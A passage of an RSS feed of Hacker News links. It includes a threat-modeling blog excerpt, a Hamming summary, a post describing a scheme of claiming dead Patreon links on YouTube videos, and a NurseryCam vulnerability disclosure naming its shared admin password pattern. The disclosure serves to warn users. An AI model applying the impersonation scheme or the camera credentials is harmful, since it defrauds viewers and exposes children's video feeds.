<p>It was still not enough (pro-tip: <strong>It will never be enough</strong>).  The good feelings faded, and the cracks started to show. We had succeeded in moving from centralized delay, to localized delay.</p>
<p>Teams were spending between 2-6 hours on each threat model, in a large part because STRIDE per element threat modeling is more art than science. We went from a single informal 30 minute meeting for some projects, to multiple meetings where we coached teams to produce formal high quality threat models for every single project they worked on. </p>
<p>This began forcing teams to question whether or not they ‚Äúhad time for security‚Äù. They were annoyed when they had to threat model projects that were obviously low risk. Quality was inconsistent.</p>
<h3>Realizations</h3>
<p>We had to reduce the number of projects that needed STRIDE-based threat modeling and we needed to reduce the time the process added to each feature release.</p>
<p>We needed a lighter weight way to assess security risk.</p>
<h2>What didn‚Äôt work: Software engineers assess risk on every story</h2>
<p>People do not always have a good sense for what they want to do in life, but often have a clear idea of things they do <em>not</em> want to do.</p>
<p><span>
      <a href="https://r2c.dev/static/85ee23f43b2c022c8ff0758fc12657fc/1dbe8/cornballer.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Cornballer" title="Cornballer" src="https://r2c.dev/static/85ee23f43b2c022c8ff0758fc12657fc/1132d/cornballer.png" srcset="https://r2c.dev/static/85ee23f43b2c022c8ff0758fc12657fc/139a5/cornballer.png 290w,
https://r2c.dev/static/85ee23f43b2c022c8ff0758fc12657fc/c08bc/cornballer.png 579w,
https://r2c.dev/static/85ee23f43b2c022c8ff0758fc12657fc/1132d/cornballer.png 1158w,
https://r2c.dev/static/85ee23f43b2c022c8ff0758fc12657fc/1dbe8/cornballer.png 1374w" sizes="(max-width: 1158px) 100vw, 1158px" loading="lazy">
  </a>
    </span>
<em>Hot security review <a href="https://apps.npr.org/arrested-development/joke-84.html" target="_blank" rel="noopener">cornballer</a></em></p>
<p>The same is true for software engineers and security. They may not always know what the most secure way is, but they have an excellent sense for when security is simply getting in the way.</p>
<p>We realized software engineers were upset about threat modeling low risk features, and we knew we needed a way to identify these up front to bypass threat modeling.</p>
<p>Slack is fairly well known for creating <a href="https://github.com/slackhq/goSDL" target="_blank" rel="noopener">goSDL</a>, a web based questionnaire that helps developers determine the level of risk their project has by asking questions about what it does and what technology it uses. This guided approach seemed like a good fit, and the format was easy to adapt to our Snowflake specific use cases. </p>
<p>Our first set of questions looked like this:</p>
<ul>
<li>Does this component make major changes or implement new authentication or security controls? (High risk)    </li>
<li>Is this project highly important strategically? (High risk)</li>
<li>Is the target for this project internal-only or a prototype? (Low risk)</li>
<li>Is this a bug fix with no major impact on functionality? (Low risk)</li>
<li>Will this component access or store sensitive customer data? (High risk)</li>
<li>Will this component introduce new third party dependencies, software, or services? (High Risk)</li>
</ul>
<p>Rather than threat model every story, we asked teams to first risk assess every story and threat model based on a ‚Äònon low‚Äô outcome.</p>
<h3>Pros &amp; cons</h3>
<p>Our first minimum viable risk assessment template was intentionally calibrated to select high risk for almost everything. We took this approach because false positives on high risk would only mean we spent more time than we needed, whereas a false positive on low risk could mean we shipped a vulnerable project.</p>
<p>We also needed auditability such that any security or compliance stakeholder could review the and validate the risk assessment regardless of how technical they were. This meant questions could not be subjective, making them more challenging to come up with.</p>
<p>We were confident when risk was assessed as low that the feature could safely skip the threat modeling process, and the volume of threat models was reduced anecdotally by about 30%.</p>
<p>Our bet was that teams would give us the same feedback about risk assessment questions that they gave us about threat models, and that they would magically become customized and more relevant for each team.</p>
<p>We quickly learned that handing teams a minimum viable product and telling them: ‚ÄúIt‚Äôs an MVP, it's intentionally painful. Go ahead and use it and customize it until it's not painful‚Äù rarely results in use, customization, or pain reduction. </p>
<p>This is classic "throwing it over the fence". It results in the perception that your process is <em>hot garbage</em>, slowing everything down.</p>
<blockquote>
<p>When a software engineer feels they have to choose between doing <del>hot garbage</del> security and doing engineering, you have lost the battle.  </p>
</blockquote>
<ul>
<li>Improving an MVP while trying to ship under pressure is difficult and creates tension.   </li>
<li>A five minute risk assessment sounds great, until someone has to do 100 of them. </li>
</ul>
<h3>Realizations</h3>
<p>We were still not asking the right questions to deselect all low risk things. </p>
<p>Taking this risk assessment MVP and making it something people like and use required much more engagement than we initially predicted. That forced us to double down on creating a robust security partner community. </p>
<p>We realized that we ‚Ä¶</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2021/appsec-development-keeping-it-all-together-at-scale/">https://r2c.dev/blog/2021/appsec-development-keeping-it-all-together-at-scale/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2021/appsec-development-keeping-it-all-together-at-scale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136766</guid>
            <pubDate>Sun, 14 Feb 2021 22:14:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I exploited existing YouTube videos with a fake Patreon profile]]>
            </title>
            <description>
<![CDATA[
Score 150 | Comments 43 (<a href="https://news.ycombinator.com/item?id=26136708">thread link</a>) | @lucas03
<br/>
February 14, 2021 | https://www.lucas03.com/how-i-exploited-existing-youtube-videos-with-a-fake-patreon-profile/ | <a href="https://web.archive.org/web/*/https://www.lucas03.com/how-i-exploited-existing-youtube-videos-with-a-fake-patreon-profile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>I am watching a lot of investing videos on youtube recently. I like to watch them while I eat, or they play in the background while I do something else. I assume that even though I don‚Äôt pay enough attention, interesting info catches my attention. I noticed there are a lot of great videos, and I thought of a way how I could exploit that. In this short text, I‚Äôll try to explain my black hat idea and if it worked.</p>



<p>I was looking for a call/put options youtube videos, as I realized <a href="https://www.lucas03.com/trading212">trading212</a> claims they pay up to 1000$ per registered user. I do invest in <a href="https://www.digrin.com/" target="_blank" title="https://www.digrin.com/">dividend stocks</a> and I like trading212 for that, but there is 0$ commission for referred accounts. I stumbled upon <a href="https://www.youtube.com/watch?v=zoFFD2EGMlg" target="_blank">this video</a> (Investing ‚Äì How I Earn $12 a Month in Dividends EASY!) from 2017 and I noticed a Patreon link there. </p>



<p><img src="https://monosnap.com/image/fb9Ccw7qEsGVYOKATw75W5RlvdRgqF" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>Youtuber <strong>DrUnlimited has 103k subscribers</strong> and the last video was posted 11 months ago. It tells me it‚Äôs an inactive account, and it‚Äôs a shame because some really good old videos are no longer viewed that much.<strong> I noticed patreon link is dead, and that DrUnlimited no longer used Patreon link in his last videos.</strong> That tells me you just tried out Patreon and gave up on it soon after.</p>



<p>Which got me thinking, can this be exploitable? Could I just find similar videos, where there were Patreon links that are no longer in use and I could claim them? I think there must be a tone if they were similar accounts (youtuber tried it in the past, but didn‚Äôt find enough patreons so he abandoned it, but never updated old videos). Well, there is only one way to find out. </p>



<p><strong>I tried to claim techcrackhouse on Patreon</strong>. I never used Patreon, so I was not familiar with the service. I created an account and within few seconds I knew this could work. I created a very simple Patreon page with a screen from the youtube channel within few minutes:</p>



<p><img src="https://monosnap.com/image/tPkZn4IMavztk4I9qaxTyhkSZ1pVYD" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>I tried to do a very simple page. Cover image from youtube, no promises on VIP content or any other upside from being a patreon. The only thing I did, was to add a 3$ a month membership and select ‚Äúgeneral support‚Äù.</p>



<figure><img src="https://monosnap.com/image/VDQAnLvKC6GD7njZ5J9xs15VVlPXEM" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>To publish a Patreon page, I had to write a 100 chars description. I didn‚Äôt want to spend time on it, so you can tell it should not motivate anyone to pay monthly payment:</p>



<p><img src="https://monosnap.com/image/PUxiPW15XghP7kbhcbBcDLPdB4MhlZ" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>That‚Äôs the <a href="https://monosnap.com/file/SFUKzVUGpjO0x7VYVuoW352EXJzXSl" target="_blank">whole patreon page</a>. I was done within half an hour on 31 of January 2021. I did not expect much, but I thought this would be interesting if that works out. And guess what? You won‚Äôt believe what email I got just 2 weeks later, on 13. February 2021:</p>



<p><img src="https://monosnap.com/image/FAxjlJ4yBrUEp9zdkjH1XoGACcZM85" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>



<p>It got me thinking how this deceiving tactic can work that easily. <strong>I‚Äôve spent literary 1 hour on it, didn‚Äôt try to do a proper Patreon page and still got to 3$ MRR</strong>. I‚Äôve been developing <a href="https://www.digrin.com/" target="_blank">digrin.com</a> for over 6 years in my free time, and I have just a few paying users. </p>



<p>So, this worked. If I would not mind recycling these old Patreon links from youtube videos, I think that can be a pretty profitable business and it provides monthly income! (I like the subscription model) If I could get a Patreon within 2 weeks after 1 hour of work, what could I get to after spending weeks doing this? What if I find bigger youtube channels? I could write scrapers for youtube (though scraping google is probably not that easy), I could use tools like <a href="https://www.lucas03.com/seoprofiler">seoprofiler</a> to find links to Patreon return 404 and recycle those pages. This plan could be pretty profitable!</p>



<p>But‚Ä¶</p>



<p>I am already sharing this with the world. I might have broken Patreon‚Äôs terms and conditions doing this. <strong>I don‚Äôt want to make money by deceiving people and parasitize on content creators.</strong> So I wrote it down, hope Patreon will block recycling Patreon pages. I‚Äôll put down my fake Patreon page right now and will also refund my single Patreon. Hope your 3$ will find better use!</p>

	</div></div>]]>
            </description>
            <link>https://www.lucas03.com/how-i-exploited-existing-youtube-videos-with-a-fake-patreon-profile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136708</guid>
            <pubDate>Sun, 14 Feb 2021 22:05:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Five lessons on doing Nobel-prize worthy work by Richard Hamming]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136688">thread link</a>) | @neilxm
<br/>
February 14, 2021 | https://neilmathew.co/you-and-your-work/ | <a href="https://web.archive.org/web/*/https://neilmathew.co/you-and-your-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Richard Hamming is one of the all-time greats in computing. As part of the <a href="https://en.wikipedia.org/wiki/Manhattan_Project#:~:text=The%20Manhattan%20Project%20was%20a,Tube%20Alloys%20project)%20and%20Canada.">Manhattan project</a>, &nbsp;he was responsible for programming IBM machines to solve atomic physics problems, and later, as part of Bell Labs, &nbsp;he was involved in nearly all of the Labs' most prominent achievements. His contributions include the <a href="https://en.wikipedia.org/wiki/Hamming_code">Hamming code</a>, the <a href="https://en.wikipedia.org/wiki/Hamming_window#Hamming_window">Hamming window</a>, <a href="https://en.wikipedia.org/wiki/Hamming_numbers">Hamming numbers</a>, <a href="https://en.wikipedia.org/wiki/Sphere-packing">sphere-packing</a> (or <a href="https://en.wikipedia.org/wiki/Hamming_bound">Hamming bound</a>), and the <a href="https://en.wikipedia.org/wiki/Hamming_distance">Hamming distance</a>.</p><p>In 1986, <a href="https://en.wikipedia.org/wiki/Richard_Hamming">Richard Hamming</a>, gave a talk at Bell Labs called <a href="https://www.cs.virginia.edu/~robins/YouAndYourResearch.html">"You and your research"</a>, in which he talked about how to do great Nobel prize-winning research. 35 years later, that advice is still very relevant, not just in academia but for almost any human endeavor. </p><p>As part of a startup building advanced tech, where R&amp;D is a core success metric, I've tried to internalize these lessons in my own work, and I thought it would be helpful to summarize the talk down for other founders, engineers, and product designers trying to do the same.</p><p><em>I've linked the actual speech in the footnotes and I highly recommend you read it. It's 13,000 words of concentrated wisdom accumulated over Hamming's incredible career, but I've distilled the talk down to 5 salient bits of advice I've taken from it.</em></p><h2 id="lesson-1-work-on-important-problems-">Lesson 1: Work on important problems.</h2><blockquote>"If you do not work on an important problem, it's unlikely you'll do important work. It's perfectly obvious." - Richard Hamming</blockquote><p>Hamming observes that great scientists always have an eye on the important problems in their field and are constantly thinking about ways to attack them. When they find an opportunity to work on an important problem, they drop everything else and pursue it head on. It's the conviction that they're working on important problems and ruthless focus that drives them to do great things.</p><p>In a startup, I'd interpret "important problems, to mean problems that you truly believe are important - important to your users, or important to the world in some way, even if it's in a small way. The key take away here is not that you should only work on problems with massive consequences like curing cancer, but that you should focus your efforts on the few important things and avoid working on unimportant things. It's easy to get into a sort of inertia while working on a product where you clearly know it's going nowhere but you feel obligated to keep working on it for various reasons (ego, investors, avoiding hard discussions). Prioritize and eliminate everything you don't believe is important.</p><p>The thought here is that you will be working towards your vision for at least 10 years of your life, and during that period you will face some great highs and some devastating lows. You'll pivot many times. Do you have it in you to grind through the worst days in pursuit of this problem? It becomes a hell of a lot easier if you believe you're making a difference in the world.</p><p><strong>Now, there's a critical caveat to defining an important problem. Hamming puts it like this:</strong></p><blockquote>"Let me warn you, `important problem' must be phrased carefully. The three outstanding problems in physics, in a certain sense, were never worked on while I was at Bell Labs. We didn't work on (1) time travel, (2) teleportation, and (3) antigravity. They are not important problems because we do not have an attack. It's not the consequence that makes a problem important, it is that you have a reasonable attack."</blockquote><p>In other words, it's not just consequence or impact that makes a problem important. Having a good strategy to attack the problem is just as essential. In that sense, Hamming says that a problem can be important because solving it will lead to other important problems. This resonated with me because it's especially crucial for startups building hard-tech. In a hard-tech startup, you must not only mitigate the extreme technical risk in your business, but you also need to deal with the market risk (i.e. will anyone use it if I build it?). So it often happens that you need to work on tangential problems in pursuit of a bigger problem, to better use resources and build confidence in the direction you're heading in. </p><p>In a previous product team I lead, we were trying to build autonomous drone technology, but building it would have taken millions in upfront investment. So we decided to first build an app that could let drone film makers track moving objects, and then used that as a proving ground to secure licensing deals with drone manufacturers.</p><p><strong>My main take away from this point,</strong> is that you should have clarity of vision, but flexibility of process. Have a general vision of why your chosen path is important, (e.g. if electric cars are feasible, then we can reduce the worlds reliance on fossil fuel), but don't just wait around for seemingly important problems to pop up. Be where the action is. Work on small tangential problems that could lead to bigger things &nbsp;(e.g. build a battery management system for a golf cart company). If there's a lot of innovation happening in an area, dive into that to increase the chances of serendipity.</p><p>Cultivate a healthy obsession for the problem and always be thinking about ways to attack it. If you don't believe what you're doing is important, you're unlikely to be effective.</p><h2 id="lesson-2-don-t-be-afraid-to-start-from-zero-and-work-on-small-problems-">Lesson 2: Don't be afraid to start from zero and work on small problems.</h2><p>Ok, so this might sound like a contradiction of the earlier point, but it isn't and here's why. </p><p>Hamming observed a phenomenon called the "Nobel prize effect" at Bell Labs, where a scientist's career seemed to peak at the Nobel prize and lull afterwords. He noticed that the reason this happened is that winning a Nobel prize raised the expectations of great work on scientists so much that they lost some of the scrappiness that brought them to that achievement to begin with. Now they could only work on big and important problems. To quote Hamming,</p><blockquote>"They fail to continue to plant the little acorns from which the mighty oak trees grow. They try to get the big thing right off. And that isn't the way things go. So that is another reason why you find that when you get early recognition it seems to sterilize you."</blockquote><p>The second reason, Hamming says, that a Nobel prize sterilizes scientists is that winning the prize gets you on various committees and panels and ultimately reduces your ability to do great work.</p><p>The same phenomenon manifests in startups. A huge influx of venture capital early in a startup's journey has destroyed many promising companies. The double whammy effect of unreasonably high expectations coupled with a false premature sense of success can lead to terrible consequences and it's not hard to find examples of this scattered all over tech publications. </p><p>If you think you can only work on problems that seem serious and important, you'll ignore the small, scrappy ideas and often the greatest opportunities are hidden inside the tiniest, stupid little ideas. Aaron Harris, who incidentally was one of my mentors at Y-Combinator, has a <a href="https://www.ycombinator.com/library/3U-why-build-toys">great post about starting small. </a>He says, </p><blockquote>"Some of the biggest technology companies look like toys in the beginning."</blockquote><p>Facebook started off as an app to let university students rate each other, followed by an online version of the Harvard University student dorm "face book". </p><p>In Hamming's words, these toys are the acorns you need to plant, to grow mighty Oak trees. You will notice that most people who've built great things, did it after they built many small, insignificant things. They let their curiosity guide them deeper and deeper into an area to master it and prepare themselves for an opportunity, that they alone were best positioned to exploit, when it presented itself.</p><p>The way I reconcile this point with lesson 1, is this. Use lesson 1 to set a general direction for yourself. But once you set that direction, you should to pursue the meandering path of genuine curiosity. Great work is built on the shoulders on many small, seemingly stupid things. Some of the greatest products were built as the compound interest of many many iterations of simpler products. </p><h2 id="lesson-3-it-ain-t-what-you-do-it-s-the-way-you-do-it-">Lesson 3: It ain't what you do. It's the way you do it.</h2><p>When Richard Hamming was tasked with using digital computers to solve certain problems for Bell Labs, that were at the time being done by analog computers, he realized that he was going to have to fight his case to the analog computing folks who would try to find faults in his solution. &nbsp;He realized that in addition to solving the problem he was tasked with, he needed to design new methods of solving problems that proved beyond doubt the superiority of digital computers. In the process, he created "Hamming's Method of Integrating Differential Equations", which became a significant milestone in the evolution of digital computing.</p><p>You often have little control over the success of your work, but you do have complete control over your systems and methods. James Clear, the author of Atomic Habits, says, <a href="https://twitter.com/JamesClear/status/1047643455722283009?s=20">"You don't rise to the level of your goals. You fall to the level of your systems"</a>. What he means is that your output is determined to a greater degree by how you do something, than what it is you do.</p><p>Reflecting on lesson 2, another benefit of working on small, simple problems, is that you might discover big problems in the pursuit of small problems. Some of the greatest pivots in startup history have been a direct result of the founders discovering a big idea in the pursuit of a small idea. <a href="https://www.wired.com/2014/08/the-most-fascinating-profile-youll-ever-read-about-a-guy-and-his-boring-startup/">The founders of Slack were originally trying to build a game called "Glitch"</a>. While working on it, they built some internal tools to improve team communication. When the game failed, they realized they'd built something much greater in the pursuit of their original goal.</p><p>Sometimes you need to work on things you think are unimportant, but if you wait for the important problems to do your best work, you're missing the point. In everything you do, do it with the same amount of fervor and diligence. Constantly optimize your processes to do better work. Even if you don't solve the problem you set out to solve, you end up solving many problems along the ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neilmathew.co/you-and-your-work/">https://neilmathew.co/you-and-your-work/</a></em></p>]]>
            </description>
            <link>https://neilmathew.co/you-and-your-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136688</guid>
            <pubDate>Sun, 14 Feb 2021 22:02:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Warning to Users of NurseryCam]]>
            </title>
            <description>
<![CDATA[
Score 134 | Comments 57 (<a href="https://news.ycombinator.com/item?id=26136667">thread link</a>) | @carwyn
<br/>
February 14, 2021 | https://cybergibbons.com/security-2/a-warning-to-users-of-nurserycam/ | <a href="https://web.archive.org/web/*/https://cybergibbons.com/security-2/a-warning-to-users-of-nurserycam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>This blog post is intended for a less technical audience ‚Äì specifically parents and nurseries using the NurseryCam system.</p>
<p><a href="https://www.nurserycam.co.uk/index.php">NurseryCam</a> is a camera system that is installed in nurseries, allowing parents to view their children remotely. There are <a href="https://www.google.com/search?q=inurl:nursery+nurserycam">tens of nurseries</a> stating that they use this system. News articles go back as far <a href="http://news.bbc.co.uk/1/hi/england/somerset/3569866.stm">as 2004</a>.</p>
<p>Serious security issues have been found in the system. The <a href="https://www.nurserycam.co.uk/web_cam_security.htm">statements that NurseryCam</a> make about the security of their system do not align with reality.</p>
<p>These issues would allow any parent, past or present, to access the video feeds from the nursery. There is also the chance that anyone on the Internet could have accessed them.</p>
<p>I am a full-time security consultant who specialises in the security of the Internet of Things, including camera systems. The issues with NurseryCam are about as serious as it gets. NurseryCam were informed of these as early as February 2015 ‚Äì 6 years ago.</p>
<h2>The System</h2>
<p>A Digital Video Recorder (DVR) is installed in the nursery, connected to cameras. These are like normal CCTV DVRs, used across thousands of businesses and homes in the UK.</p>
<p>The DVR has a web interface that can be viewed in a browser, but it would normally only be possible to view this when you are connected directly to the nursery‚Äôs network. This is because the DVR is behind the router‚Äôs firewall.</p>
<div id="attachment_5044"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-1024x649.png" alt="" width="646" height="409" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-1024x649.png 1024w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-300x190.png 300w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw-768x487.png 768w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_21_50-Untitled-1-LibreOffice-Draw.png 1030w" sizes="(max-width: 646px) 100vw, 646px"></a></p><p>Without port forwarding,the DVR cannot be accessed.</p></div>
<p>To allow the DVR to be viewed remotely, something called port forwarding is used. This opens a hole in the nursery‚Äôs firewall, allowing the DVR to be accessed from the Internet.</p>
<div id="attachment_5045"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw.png" alt="" width="993" height="632" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw.png 993w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw-300x191.png 300w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-14-15_23_48-Untitled-1-LibreOffice-Draw-768x489.png 768w" sizes="(max-width: 993px) 100vw, 993px"></a></p><p>Port forwarding allows access to the DVR from the Internet</p></div>
<p>To log in to the DVR, you need to know the username, password, and IP address.</p>
<p>When a parent wants to view the cameras, they log in to the NurseryCam website or mobile application. In the background, the parent is given the details for the DVR, including the username and password.</p>
<div id="attachment_5046"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled.png" alt="" width="537" height="434" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled.png 537w, https://cybergibbons.com/wp-content/uploads/2021/02/Untitled-300x242.png 300w" sizes="(max-width: 537px) 100vw, 537px"></a></p><p>The normal log in procedure for a parent</p></div>
<p>The parent then establishes a direct connection to the DVR, allowing them to view the camera.</p>
<h2>The Issues</h2>
<p>For all parents connecting to a given nursery, they are given the same username and password for the DVR. In the examples I have been shown, the username is <em>admin</em> and the password are obvious words followed by 888.<em><br>
</em></p>
<p>This means that the parents, past and present, have all been given the administrator password for the DVR.</p>
<p>There are no indications that this password changes over time.</p>
<p>There is no need for the parent to login to the NuseryCam website to access the DVR.</p>
<div id="attachment_5047"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled1.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/Untitled1.png" alt="" width="283" height="277"></a></p><p>There is no need to login to the NurseryCam servers to login to the DVR</p></div>
<p>With these details, the parent could connect directly to the DVR at any time of the day, view it for however long they want, and view all of the cameras, including ones you have not given them permission to view.</p>
<p>You can lock or delete the parent account on the NurseryCam website, but the username and password for the DVR will not change.</p>
<p>There is no way to stop the parent from logging into the DVR directly.</p>
<p>Anyone logging into the DVR would be seen as the admin user. It would be incredibly difficult for a nursery to determine if the login was from a genuine parent or someone else.</p>
<p>To make matters worse, the connection to the DVR is using HTTP, not HTTPS. It is unencrypted, allowing someone to eavesdrop on the video feed, username, and password.</p>
<h2>The Risks</h2>
<p>Any given parent for a given nursery could login to the DVR and view any and all cameras.</p>
<p>This could include:</p>
<ol>
<li>A current parent viewing cameras for longer than they are meant to.</li>
<li>A current parent viewing cameras that they are not entitled to, such as rooms their child does not use.</li>
<li>A parent whose child no longer attends the nursery viewing the cameras.</li>
<li>Any parent who has been prevented from accessing the system (e.g. separation, abuse) viewing the cameras.</li>
</ol>
<p>Worse still, because the password for the DVRs is common across multiple nurseries and <a href="https://www.google.com/search?q=site%3Anurserycam.co.uk+nurserycam888">openly documented</a> on NurseryCam‚Äôs website, there is the potential for <strong>anyone</strong> on the Internet to access the DVR.</p>
<div id="attachment_5063"><p><a href="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw.png"><img loading="lazy" src="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw.png" alt="" width="992" height="909" srcset="https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw.png 992w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw-300x275.png 300w, https://cybergibbons.com/wp-content/uploads/2021/02/2021-02-15-09_24_46-Untitled-1-LibreOffice-Draw-768x704.png 768w" sizes="(max-width: 992px) 100vw, 992px"></a></p><p>Port forwarding does not restrict connections to be from parents ‚Äì anyone can access the DVR</p></div>
<p>The only missing piece of the puzzle is the IP address of the nursery. It would be possible to scan the entire of the UK for DVRs using this username and password in a matter of days.</p>
<p>Staff at NurseryCam would know the password and be able to access the DVRs without restriction.</p>
<h2>The Discrepancies</h2>
<p>NurseryCam <a href="https://www.nurserycam.co.uk/web_cam_security.htm">state</a> that their system is ‚Äúsafer than online banking‚Äù.</p>
<p>This is certainly not the case with the system seen here.</p>
<p>A common, shared, and openly documented login for the DVRs is passed to each parent.</p>
<p>There is no encryption used. There are no VPNs.</p>
<p>This is analogous to your local bank giving you the keys to their vault and just trusting that you will only take your money.</p>
<p>The same claims are repeated across multiple nursery websites.</p>
<h2>The Disclosure</h2>
<p>When security researchers find problems like this, we try to report them to the company so that they can be fixed.&nbsp; The aim is to keep users of the system safe. We call this disclosure.</p>
<p>I reported these to NurseryCam on <strong>6th February 2021</strong>.</p>
<p>On <strong>12th February 2021</strong>, I blogged about these initial concerns and Tweeted them.</p>
<p>Former parents reading my Twitter feed got in touch, with one parent confirming that they had informed NurseryCam of almost identical issues in <strong>February 2015</strong> ‚Äì six years ago.</p>
<p>Even six years ago, the claims made about security did not line up with reality.</p>
<p>They have been aware of serious security issues for 6 years and have not fixed them.</p>
<h2>How were these found?</h2>
<p>The NurseryCam Android mobile application was downloaded and then examined. By viewing the code, it was possible to see how the system operates.</p>
<p>Several parent users of the system have contacted me. They confirmed that the system operated as I suspected and that the DVR usernames and passwords were the same each time they logged in.</p>
<p>There has been no attempt to hack NurseryCam webservers.</p>
<p>These issues were trivial to uncover, taking no more than 15 minutes.</p>
<h2>What should you do?</h2>
<p>In my professional opinion, you cannot quickly fix a system that is this badly broken. You also cannot regain the trust that has been lost by selling a product that is described so inaccurately.</p>
<p>If you, as a nursery, operate one of these systems:</p>
<ol>
<li>Unplug the network connection from the DVR.</li>
<li>Contact NurseryCam and ask that they inform all impacted nurseries immediately.</li>
<li>Ask why the system you have been paying for isn‚Äôt the one that is described on the NurseryCam site.</li>
</ol>
<p>If you are a parent, I would advise contacting your nursery and request that they carry out the above steps.</p>
<h2>Inadequate Fixes</h2>
<p>Changing the username and password for the DVR is not a genuine fix ‚Äì the username and password are still sent to the parents.</p>
<p>Adding encryption to the connections is not a fix ‚Äì the username and password are still sent to the parents.</p>
<h2>My Opinion</h2>
<p>These issues are obvious and fundamental. They should not have existed in the first place.</p>
<p>Without the system being almost completely redesigned, it is hard to see how it can be secured adequately.</p>
<p>I have not tested their website, or looked at any of their other security practices.</p>
<p>Ask yourself if you could ever trust this company again with children‚Äôs data.</p>









			</div></div>]]>
            </description>
            <link>https://cybergibbons.com/security-2/a-warning-to-users-of-nurserycam/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136667</guid>
            <pubDate>Sun, 14 Feb 2021 22:00:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What ever happened to scandium bike frames? (2016)]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 51 (<a href="https://news.ycombinator.com/item?id=26136608">thread link</a>) | @dfgdghdf
<br/>
February 14, 2021 | https://www.bikeblogordie.com/2016/11/what-ever-happened-to-scandium-bike.html | <a href="https://web.archive.org/web/*/https://www.bikeblogordie.com/2016/11/what-ever-happened-to-scandium-bike.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.bikeblogordie.com/2016/11/what-ever-happened-to-scandium-bike.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26136608</guid>
            <pubDate>Sun, 14 Feb 2021 21:51:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why do we write design documents?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26136422">thread link</a>) | @declanhaigh
<br/>
February 14, 2021 | https://blog.royalsloth.eu/posts/why-do-we-write-design-documents/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/why-do-we-write-design-documents/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Starting a greenfield project is loads of fun, but you can‚Äôt avoid
the dentist‚Äôs appointment indefinitely and at some point you will have to write
that design document your boss expects to see on their table. Despite the fact that most people
learned how to write in childhood, more often than not they are struggling
when it comes to writing lengthy documents. The big blank page is daunting
and it‚Äôs hard to get into the mood for writing, because it‚Äôs time consuming and
not as fun as programming.</p><p>How do I even start explaining what we are trying to build when I don‚Äôt have
the slightest clue about the thing we are building?
It‚Äôs just an API this middle manager put me in charge of,
why would I waste my time with writing the design document when by the
time I am finished writing I could already have the API up and running?</p><p>If the API is so simple that even a kid can understand its purpose, isn‚Äôt writing a few
pages about it a trivial thing to do? I am sure you can solve a primary school‚Äôs math
problem without breaking a sweat, so why would you struggle with
